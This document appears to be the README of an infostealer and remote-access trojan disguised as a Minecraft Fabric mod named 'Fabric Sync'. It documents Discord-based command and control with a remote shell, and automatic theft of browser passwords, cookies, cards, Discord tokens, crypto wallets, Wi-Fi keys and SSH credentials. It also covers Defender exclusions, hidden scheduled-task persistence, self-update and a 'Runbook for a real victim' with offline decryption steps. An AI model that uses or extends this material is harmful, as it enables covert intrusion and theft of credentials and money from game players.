# Fabric Sync

Fabric client mod for Minecraft 1.20.1. It presents itself as a configuration synchronizer for a private server pack. The mod id stays `serverpackcore` so existing updates keep working; only the visible name is `Fabric Sync`.

## Architecture

The project produces two artifacts:

- **Mod** (`fabric-sync-<version>.jar`): loader and stager. The mixin on `MinecraftClient.tick` waits until in a world, waits a random 20 to 60 seconds and, once per session, extracts and launches the agent. It contains no C2 or collection logic.
- **Agent** (`agent.jar`, embedded as `serverpackcore/agent.bin` and installed as `runtime.jar`): independent Java process with the remote shell and the collector. Pure Java, no dependencies; it does not reference `net.minecraft`.

Every reference to `net.minecraft` is confined to the mixin and the entrypoint.

Install directories:

- Windows: `%LOCALAPPDATA%\FabricSync`
- Linux: `$XDG_DATA_HOME/FabricSync` or `~/.local/share/FabricSync`
- macOS: `~/Library/Application Support/FabricSync`

An existing `%LOCALAPPDATA%\ServerPackCore` wins over a new directory. Such a tree is *legacy*: it keeps `spc-agent.jar`, `alive.txt`, `state.json`, `spc-update.*` and the `\ServerPackCore` task because the already deployed helper references those names. Everything visible (`cache/`, `sync-*.zip`, embeds and uploads) is modern even there. A fresh tree uses `runtime.jar`, `session.txt`, `config.json`, `update.*`, `startup.vbs` and the `\FabricSync` task.

The agent writes `session.txt` with the game PID and its own. The `runtime.lock` lockfile prevents duplicates. The `.version` marker stores the installed version; if `javaw.exe` or `runtime.jar` disappears, the stager extracts them again. The install directory is marked hidden with `attrib +h`, not system.

## C2 over Discord

The credentials are not committed. The build generates `DiscordSecrets.java` from, in order: `local.properties` at the repo root, the `SPC_BOT_TOKEN`, `SPC_GUILD_ID` and `SPC_CATEGORY_ID` environment variables, or the `SPC_PLACEHOLDER` fallback. `local.properties.example` shows the keys; a plain checkout without credentials still compiles. `DiscordConfig` aliases the generated constants.

`./gradlew checkSecrets` fails when any credential is missing or still a placeholder, and `./gradlew release` runs it before `build`.

The primary transport is a single Gateway WebSocket per agent, with no gateway on the polling thread or the command pool. On first start it creates a channel named `sync-<host>-<user>` under the category, registers its own webhook for attachments and sends an embed titled `Fabric Sync`. If channel creation fails, it creates a shared one with the `sync-shared-` prefix.

The `MESSAGE_CONTENT` intent is required for maximum speed: without it, content arrives empty and every message forces a REST call. The agent detects close 4014, reconnects with intents 513, warns on the channel and stays operational with REST every 2 s. If the gateway goes down for another reason, the REST fallback uses 2 s with jitter and moves to 30 s after 10 minutes without activity. 429 responses honor `retry_after`; network errors use capped exponential backoff. The token is never logged.

Local state in `config.json`: version, channel, webhook, last ID and last heartbeat. It stays local and is not packed into the harvest.

## Commands

`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.

`help` lists the commands in the channel; `bootstrap` re-runs the automatic first-run collection.

`gateway status` shows state, last ACK RTT, reconnects and last close code; `gateway restart` closes with 4000 to test resume.

`shell` uses `cmd /c` or `/bin/sh -c`, merges stdout and stderr and cuts at 60 s. Outputs over 1000 characters are uploaded as `out-<ts>.txt`; the rest goes in a four-backtick block.

## Harvest

The harvest ZIP is `cache/sync-<ts>.zip`. It includes launcher accounts, autologon/`Unattend.xml` administrator hints, the Discord token validated against `/users/@me` (or, when the stored token is encrypted, the raw LevelDB files under `discord/raw/`), Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History` plus their `-wal` companions, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing.

On Windows it also runs ChromElevator v0.20.0 per browser and writes `browsers/<label>/abe/*.tsv` (cookies, passwords, cards, IBANs, Google tokens). The tool is embedded in the agent, verified against a pinned SHA-256, extracted to `cache\tools` and run in the user session with the browser's own elevator, so it needs neither administrator nor `SECURITY.hiv`. If it fails, `keys.txt` keeps `app_bound=`, records `abe_error=` and the harvest continues; `hives` remains the fallback.

The Discord token is read from LevelDB directly: `.ldb` blocks are Snappy-decoded, `.log` records reassembled, the `dQw4w9WgXcQ:` value base64-decoded, the DPAPI blob unwrapped with `ProtectedData` scope `CurrentUser`, and the token validated against `/users/@me`. It lands in `discord/token.txt`. Raw LevelDB files stay as fallback.

Cookies and `Login Data` are uploaded encrypted. `keys.txt` carries the unwrapped AES key although the ABE TSV already contains the plaintext rows. The ZIP is cut at 12 MB and skips files over 2 MB.

## First run

On Windows the first start needs no input, no password and no UAC. About 45-75 s in, the agent runs a background bootstrap that uploads, as separate files, system recon, `cmdkey`/RDP/FTP credentials, Wi-Fi profiles with the key, Discord, Telegram, Steam and Firefox sessions, Exodus/Electrum/Ledger, the MetaMask and Phantom extension stores, `.ssh`/cloud CLI material and a screenshot.

Runbook for a real victim:

1. Install Fabric Loader 0.20.1 and Fabric API for 1.20.1, then copy `fabric-sync-<version>.jar` into the profile's `mods/`.
2. Open Minecraft and enter any world. The stager fires after 20-60 s and creates `%LOCALAPPDATA%\FabricSync` hidden.
3. The agent creates the `sync-<host>-<user>` channel, posts the `Fabric Sync` embed and starts the bootstrap.
4. The harvest uploads on its own, including ABE v20 and the Discord token, then deletes the local ZIP.
5. Persistence and signed auto-update are already on; close the game and confirm the agent returns after logon.
6. Only if v20/Discord are missing, send `hives` and accept the single UAC prompt.

Hives are not part of the automatic run. `hives` remains a manual command and fallback for offline `secretsdump`; it gives up after three attempts per manual run. Its elevated script first adds persistent Defender exclusions for the install directory, the mods folder, `reg.exe` and `esentutl.exe`, then saves the hives to `cache/system-<ts>.zip`.

Every automatic step has a marker and its own upload, so a crash retries only the unfinished part. The same run enables `persist` and auto-update; `persist off` and `update auto off` still stick afterwards.

`SHELL.md` keeps the commands for specifics: extra Windows profiles, extra browsers, repeating the hives, or repairing a botched first run.

## Upload parts

Discord caps a single attachment. Anything over 8 MB is split into `sync-<ts>.zip.part01`, `.part02`, … Reassemble in lexical order:

```sh
cat sync-<ts>.zip.part* > sync-<ts>.zip
sha256sum sync-<ts>.zip
```

On Windows:

```powershell
Get-ChildItem sync-*.zip.part* | Sort-Object Name |
  ForEach-Object { Get-Content $_.FullName -AsByteStream -Raw } |
  Set-Content sync.zip -AsByteStream
```

The parts are 7 MB each, so the case of more than 99 parts is not expected but `part100` sorts after `part99` incorrectly; pad or sort numerically if it ever happens.

## Procesar un caso

`tools/ingest-case.sh` automatiza el post-procesado. No descarga de Discord: deja los adjuntos en `<caso>/raw` y ejecuta:

```sh
CASE_PASSWORD='...' tools/ingest-case.sh ~/spc/in-027 --clean --prune
```

El script:

1. reensambla cada familia `.partNN` y exige que empiece en `01` y sea contigua;
2. verifica todos los ZIP con `7z t` y exige un `sync-*.zip`;
3. guarda `SHA256-raw.txt`;
4. extrae sin duplicar carpetas raíz y coloca `discord`, `ext`, `exodus`, `electrum`, `keys`, `tdata` y `wifi` en su sitio;
5. comprueba token, ABE y carpetas esperadas;
6. ejecuta `decrypt.py` sin contraseña de Windows y revisa `summary.txt`;
7. archiva todo en `<caso>.7z` con AES-256 y nombres cifrados, lo verifica y solo entonces borra `work/` con `--clean` y `raw/` con `--prune`.

Sin `CASE_PASSWORD` pide la contraseña dos veces. `--force` permite repetir sobre un caso ya procesado. Si algo falla, conserva el árbol y no borra nada.

## Decrypting a harvest

`decrypt.py` is the offline side. It takes a harvest ZIP or an extracted directory and opens what the collected material allows: `discord/token.txt`, ABE TSV under `browsers/*/abe/`, browser AES keys, v10 and v20 cookies, saved passwords, Discord tokens, Exodus/Electrum/Phantom wallets and launcher accounts. Everything lands in `decrypted-<name>/` with `0600`, plus `report.json` and `summary.txt`.

```
./decrypt.py sync-0000.zip --list                 # inventory only
./decrypt.py sync-0000.zip                        # 0.2.7: no password needed
./decrypt.py legacy-harvest.zip -p 'Password1'    # old user DPAPI blobs
./decrypt.py legacy-harvest.zip --machinekey <hex>  # old raw v20 without ABE
```

A 0.2.7 harvest carries validated `discord/token.txt`, `v20=` in `keys.txt` and plaintext ABE TSV, so v20 cookies and the Discord token open without `-p` or `--machinekey`. Older harvests still need the Windows password, and v20 without ABE still needs the DPAPI_SYSTEM machinekey, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints it as `dpapi_machinekey`, and `--machinekey` derives the `S-1-5-18` masterkeys from the copied folder (`--system-protect`, default `dpapi/Protect/S-1-5-18`). Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` only for Phantom and `zstandard` only for some Exodus payloads; missing optional pieces are reported, never fatal.

## Persistence

`persist on` is idempotent and prepares autostart: a hidden scheduled task on Windows or a `.desktop` file in `~/.config/autostart` on Unix.

On Windows it uses a logon task (`\FabricSync` in a modern tree, `\ServerPackCore` in a legacy one) with `<Hidden>true</Hidden>`; it does not appear in Task Manager's startup tab, which only lists `Run`/`RunOnce`, Startup folders and UWP tasks. The task, created via `schtasks /create /xml`, is also invisible in Task Scheduler unless hidden tasks are enabled. If `schtasks` fails, it falls back to the classic `Run` value so persistence is not lost.

The task does not point to the copied `javaw.exe`: a loose launcher cannot find `lib\jvm.cfg` or `bin\server\jvm.dll` without `JAVA_HOME`. It generates `startup.vbs` (legacy: `spc-sync.vbs`) in the install directory, which sets `JAVA_HOME`, starts hidden and tries the real runtime's `javaw.exe`, the local copy and finally `%JAVA_HOME%`.

The agent marks `persist` in the state file and regenerates the launcher and task on every start, so it repairs itself if the runtime path changes, an antivirus deletes the task or it is disabled. `persist off` removes the task, inherited `Run` values, `StartupApproved` and the `.vbs`.

It is not invisible to everything either: `schtasks /query`, the `C:\Windows\System32\Tasks` tree and Autoruns still see it. Real hiding requires services or `Winlogon\Shell`/`Userinit` (HKLM, with admin) or a permanent WMI subscription.

If another pack leaves `wscript`/`.vbs` startups, `persist on` lists them and warns if their path no longer exists or if they reuse our directory. They coexist unless they kill `java`/`javaw` processes or step on the `FabricSync` task/value.

## Self-update

`DiscordConfig.UPDATE_MANIFEST_URL` points to `https://github.com/uloaeth/server-pack-core/releases/latest/download/update.json`.

The manifest is signed with RSA-3072. The private key stays offline at `~/.config/spc/update-signing-key.pem` and is never committed; the public key lives at `agent/src/main/resources/serverpackcore/update-public.pem`.

Public key fingerprint (SHA-256 of the DER SubjectPublicKeyInfo):

```
SHA256:4b21192f465959642cc3c484f67586b85fa4b52208cb79bde91feb80c490b154
```

Updates are manual by default. `update auto on` opts in: the first run happens 10 minutes later and then every 24 h with ±10 % jitter. `update auto off` cancels and clears the slot; bare `update auto` shows the state, the next run and the consecutive failures.

The scheduler ticks every 60 s and shares a gate with manual updates, so two never overlap and the loser leaves the state untouched. A manual update or rollback that succeeds resets the failure count and schedules the next slot. Failures back off 1 h, 2 h, 6 h and then cap at 24 h. `autoNext` and `autoFailures` are stored in the state file, so a restart waits for the stored slot instead of firing immediately. Automatic runs do not apply while a manual command has left something staged.

Recovery covers a failed start and a late failure in the watchdog window: the previous agent is restored and the restart counts as a failure with backoff. An intentional stop or a newer update never triggers a rollback. The first install of 0.1.3 is manual; 0.2.1/0.2.2 still need a manual hop.

`update` verifies the signed manifest, stages the jar, then applies it and answers `Updating to X`. The agent exits and a detached helper waits for it to die, keeps the previous jar as `runtime.old` (legacy: `spc-agent.jar.old`), swaps in `update-new.jar` (legacy: `spc-agent-new.jar`), deletes any `.bad` and restarts with `-Xmx96m -jar` plus the original `--game-dir`. The game stays open. After the new agent has stayed up for 20 s the helper records `status=ok` and deletes the staged jar; otherwise it kills the new process, restores the previous jar, restarts it and records `status=rollback`. The failed jar is kept as `runtime.bad`.

The helper then watches the new agent for another 10 minutes (`-Dspc.watchdogSec`, 0 disables). If the tracked agent dies in that window, the helper kills any survivor, restores the previous jar, restarts it with the original game PID and records `status=rollback-late`; the startup rollback marker makes the restored agent count one failure and back off. There is exactly one late attempt and no second window. A healthy expiry records `status=watchdog-cleared`.

The agent writes `update.intent` (legacy: `spc-update.intent`) atomically as `<action> <agent-pid>` before any kill: `stop <pid>` for `kill` and `replace <pid>` for `update`, `update apply` and `update rollback`. A matching stop marker ends the watchdog without a restart. A matching replace marker means a newer helper owns the swap, so the old helper logs `status=watchdog-replaced` and exits instead of fighting it. A marker for another PID is stale and ignored.

`update stage` only verifies and downloads `update-new.jar`; `update apply <version>` applies an already staged jar; `update rollback` swaps back to `runtime.old` and keeps the replaced jar as `.bad`. `update check` reports the offered version and notes without touching the disk; `update status` shows the last attempts recorded in `logs/update.log` (legacy: `update.log`). `-Dspc.updateManifest`, `-Dspc.updatePublicKey` and `-Dspc.updateLog` override the manifest URL, the public key path and the log path for local testing.

Unix uses `setsid` when available and `nohup` otherwise. The Windows VBS helpers are implemented and syntax-checked under Wine, but have not been run on a real Windows host yet.

### Mod updates

The same manifest carries the mod jar. `update` and `update stage` download it as `mod-update.jar` (legacy: `spc-mod-new.jar`) and validate `fabric.mod.json`, the id, the version and that the mod does not reference agent classes.

The mod is not swapped while Minecraft runs. A second helper (`mod-update.sh`, `mod-update.vbs`) waits for the game PID recorded in `session.txt` to exit, then disables every enabled `serverpackcore-*.jar` or `fabric-sync-*.jar` to `.old`, installs `fabric-sync-<version>.jar` and deletes stale `.bad` files. There is only ever one enabled mod jar. When the game is already closed the swap happens in the agent instead of a helper.

`update rollback` reverts both artifacts when both `.old` files exist: the mod helper restores the newest `.old` under its original name and keeps the reverted jar as `.bad`. Without a game directory the mod stays staged and only the agent is updated. The agent restart is independent of the game and happens with the game open; the mod change applies on the next game start.

## Requirements

- Build: JDK 21 or newer (with `JAVA_HOME` pointing to that installation)
- Run: Java 17 or newer; tested on Java 17, 21 and 25
- Gradle 9.8.2 available on `PATH` to regenerate the wrapper

Generated bytecode is pinned to Java 17 (major 61) with `options.release = 17`.

Loom is pinned to 1.17.21: the 1.18+ series (including 1.19.3) is compiled for JVM 25 and breaks the 21/25 build matrix.

## Runtime compatibility

The minimum loader is 0.20.1, required to run on Java 25. `runClient` works on Java 21 and 25.

## Wrapper generation

`gradlew`, `gradlew.bat` and `gradle/wrapper/gradle-wrapper.jar` are binary and are not included as text. Generate them once at the project root:

```sh
gradle wrapper --gradle-version 9.8.2
chmod +x gradlew
```

On macOS, use `base64 -D` instead of `base64 -d` to decode binaries from base64.

## Local fixtures

`.blob/` (about 313 MB, with a 158 MB `ex.zip`) contains local fixtures used by `decrypt.py`. It is not tracked in git and is not needed to build: it can stay on disk only.

## Build

Requires JDK 21+ in `JAVA_HOME`; an older JDK fails the build with an explicit message. The jar is compiled to bytecode 17 and `check` verifies that no class exceeds it.

```sh
JAVA_HOME=/path/to/jdk21-or-newer ./gradlew build
```

The root task builds `agent/` with a separate Gradle build and copies `agent.jar` to `src/main/resources/serverpackcore/agent.bin` before `processResources`. The final jar is left in `build/libs/fabric-sync-<version>.jar`.

## Installation

1. Create a Fabric Loader 0.20.1 profile for Minecraft 1.20.1.
2. Remove any previous `serverpackcore-*.jar` or `fabric-sync-*.jar` from the profile's `mods/` folder.
3. Install Fabric API 0.92.12+1.20.1 in the profile (optional).
4. Copy `build/libs/fabric-sync-<version>.jar` to the profile's `mods/` folder.

## Tests

```sh
./gradlew test   # agent and stager tests
./gradlew check  # tests + verifyBytecode
```

The tests use temporary directories and local processes; they need neither network nor Discord. ABE and LevelDB have fixture tests that run on Linux; the executable itself only runs on Windows.

For manual tests of commands sent through a webhook, start the agent with `-Dspc.webhookCommands=true`. Webhook messages are ignored by default so the agent's own uploads do not trigger REST polls.

## Acceptance test

1. Run `./gradlew build` and confirm it finishes without errors or warnings.
2. Run `./gradlew runClient`, confirm the mod appears as `Fabric Sync` and the log has no mod output in release.
3. Enter a world, wait for the trigger and check `session.txt` has both PIDs and the agent is alive after closing the game.
4. Check the new `sync-...` channel under the category has the `Fabric Sync` embed and ZIP without any UAC prompt.
5. Confirm `browsers/*/abe/` is present and the Discord token validates.
6. Send `shell dir` from the phone and get a reply in under 1 s via the gateway.
7. Run `persist on`, reboot and confirm the agent returns on its own.
8. Run `ls`, `cat missing`, `ping`, `gateway status`, `persist on`, `persist off` and `kill`; all replies must be in English.
9. Only if needed, run `hives`, accept the single UAC prompt and confirm `cache/elevate.bat` is the script shown.

## Known limits

- Fabric API is no longer required and none of its classes are used.
- Disabling `MESSAGE_CONTENT` cannot be fixed from code: the gateway enters through 4014, switches to intents 513 and every message depends on REST (more latency and more rate usage).
- The LevelDB reader is deliberately small: unusual codecs or future Discord layouts still fall back to raw files.
- ABE depends on the embedded x64 ChromElevator binary; ARM64 hosts fall back to the PowerShell unwrap and then to `hives`.
- The ZIP cuts at 12 MB and skips files over 2 MB, so large wallets or profiles may be incomplete.
- GPU and public IP depend on external commands or services; without network or `wmic`/`lspci` they stay `unknown`.
- `screenshot` requires a graphical session; headless environments return an error.
- If the gateway is down, the REST fallback adds latency (2 s active, 30 s idle).
- The bot token and IDs are compiled in at build time; changing them requires rebuilding the agent.
- Cookies and `Login Data` are uploaded encrypted. ABE TSV is plaintext from the browser elevator; `keys.txt` still carries `v20=` for the database rows.
- On Linux the launcher uses `setsid nohup`; if the environment lacks them, the process may die with the game.
- Windows persistence depends on `wscript.exe`: if Windows Script Host is disabled, the entry does not start. Copying `javaw.exe` alone is not a fallback because it needs the full runtime.
